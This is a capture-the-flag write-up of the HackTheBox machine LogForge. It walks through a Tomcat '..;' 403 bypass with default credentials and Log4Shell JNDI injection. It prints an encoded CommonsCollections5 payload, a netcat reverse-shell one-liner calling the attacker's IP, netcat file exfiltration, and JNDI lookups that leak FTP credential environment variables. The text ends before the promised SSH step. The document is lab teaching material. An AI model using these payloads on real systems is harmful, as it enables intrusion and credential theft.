## HTB Logforge (Medium) - Writeup

Difficulty: Medium

Discovered a Tomcat server with a /manager panel, accessed via a 403 bypass using a path traversal trick.  
Identified and exploited Log4Shell by injecting a JNDI payload in a logged parameter, leading to RCE.  
Gained a reverse shell using a serialized CommonsCollections gadget via JNDI Exploit Kit.  
Escalated to root by exfiltrating environment variables through Log4j to retrieve FTP credentials, then SSH’ed in with a leaked private key.  

---

## Nmap 

#### The nmap scan revealed two open and two filtered ports:  

![obraz](https://github.com/user-attachments/assets/0ece98b9-cef6-4d45-a3a3-f90b4ee531e8)



## Port 80 - Website  

The website consists solely of a static image, with no interactive or visible functionality.  

![obraz](https://github.com/user-attachments/assets/d312d04b-86a8-4f03-8c27-6f5f9e1c7776)  

Running Feroxbuster revealed the /admin directory, which returns a 403 Forbidden error.  

![obraz](https://github.com/user-attachments/assets/5a2e7c4a-5b0f-4ec1-aaca-9911d45f078e)

It also revealed that the website is running tomcat because of directories like /manager.  

We can check the headers with curl:  
```
curl -I http://10.10.11.138/
```
![obraz](https://github.com/user-attachments/assets/fbdeb2ba-365e-4216-ab4a-7fc06120e697)

It returns with Java cookie which indicates that backend is written in Java.  
Tomcat is also written in Java meaning it's another hint.  
We can re-run feroxbuster with additional extensions and different list:  
```
feroxbuster --url http://10.10.11.138/ -x js,jsp,java,xml -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
![obraz](https://github.com/user-attachments/assets/6da9c81a-f398-4eac-be41-438626053592)

It found index.jsp but nothing more of interest.  



## 403 bypass trick

If we go to /manager we get 403 access denied.  
There is a report written by Orange Tsai that is a must read if you didn't do it already:  
```
https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
```
I'll paste the part about tomcat here:  

![obraz](https://github.com/user-attachments/assets/815b0036-d80d-4262-814f-d6d2a8c43d4c)

It bypasses Tomcat’s path parsing and normalization logic.  

We can now access:  
```
http://<ip>/x/..;/manager
```
Luckily for us default credentials worked
+  tomcat:tomcat

![obraz](https://github.com/user-attachments/assets/a3030bff-0336-4526-89c6-a23499c5101e)



## Log4Shell - exploitation  

Given the name of the box there might be a log4shell vulnerability.  
There is an application /UHC{BadWayToBlockTomcat}  
We can click on expire and catch a request with burpsuite:  

![obraz](https://github.com/user-attachments/assets/35653c2b-6171-4198-83aa-deefeb5ad9be)

There is only one parameter called "idle", we can try basic log4shell payload to test if that's a case here.  
For it to work we must put a paylod in the field that will be logged by log4j java library.  
```
{% raw %} idle=${jndi:ldap://10.10.14.5/x}  {% endraw %}
```
And start tcpdump to listen for pings:  

![obraz](https://github.com/user-attachments/assets/995635a4-df56-4f8f-b3cf-4bdd462f0263)

![obraz](https://github.com/user-attachments/assets/665c180b-521b-4747-b257-f2cbfc9a9d85)

It works, now we want to get shell access.  
I had many problems with getting this shell.  
First I tried to run python server and marshalsec-jar ldap server but it couldn't redirect to my python server.  
Then I tried creating .ser paylod with ysoserial and running JNDI EXPLOIT KIT but it didin't work either.  
Finally the thing that worked was creating a payload directly in JNDI EXPLOIT KIT.  
In order to exploit this we need JNDI EXPLOIT KIT:  
```
git clone https://github.com/pimps/JNDI-Exploit-Kit.git 
mvn clean package -DskipTests
cd target
```
Then run it:  
```
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar
```
Now run a special query to create a payload and run it:  
```
{% raw %}  ${jndi:ldap://10.10.14.5:1389/serial/CommonsCollections5/exec_unix/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pICAyPiYxfG5jIDEwLjEwLjE0LjUgIDkwMDUgPi90bXAvZg==} {% endraw %}
```
It failed with most of the payloads but the one we used and succeed was:  
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i  2>&1|nc 10.10.14.5  9005 >/tmp/f
```
In final payload we had to base64 encode it:  

![obraz](https://github.com/user-attachments/assets/21269274-b002-4327-9ce2-2b0b16194190)

It then gets to our server:  

![obraz](https://github.com/user-attachments/assets/1ba06685-e2e7-4653-bcf0-c88455d0f991)

And finally gives us a shell access:  

![obraz](https://github.com/user-attachments/assets/1f97c494-ae4c-4cd8-b974-5a46369af3af)



## Priv Esc

First we can retrieve a flag:  

![obraz](https://github.com/user-attachments/assets/ec491b2e-a816-4008-afaf-cc7e90cbf557)

There is a file ftpServer-1.0-SNAPSHOT-all.jar we can move it with netcat:  
```
Attacker:  
nc -nvlp 80 > ftpServer-1.0-SNAPSHOT-all.jar

Target:    
nc -w 3 10.10.14.5 80 < ftpServer-1.0-SNAPSHOT-all.jar
```

![obraz](https://github.com/user-attachments/assets/f40be02c-0e19-472e-bb6c-607ed71a4bcb)

![obraz](https://github.com/user-attachments/assets/e8255198-0ede-47e1-88cd-144e0d41b838)


To reverse engineer java files we can use jd-gui:  

![obraz](https://github.com/user-attachments/assets/0301bf26-20e8-4a05-81fd-95b4083759a0)

After looking through code we found credentials as two environment variables being set:  

![obraz](https://github.com/user-attachments/assets/bdce03e3-d03b-4656-8cef-c7725411091d)

In the username parameter it uses log4j library:  

![obraz](https://github.com/user-attachments/assets/1cb1e8a1-6d7a-45cf-9896-685d5bb6cf9e)

It means that we can connect to ftp and in the username parameter put JNDI payload like we did in the website to get a shell access.  
For it to work we need to start jdni exploit kit server as before.  
Then log into ftp on the target machine twice and use following payloads:  
```
{% raw %} ${jndi:ldap://10.10.14.5:1389/${env:ftp_user}} {% endraw %}
{% raw %} ${jndi:ldap://10.10.14.5:1389/${env:ftp_password}} {% endraw %}
```












































































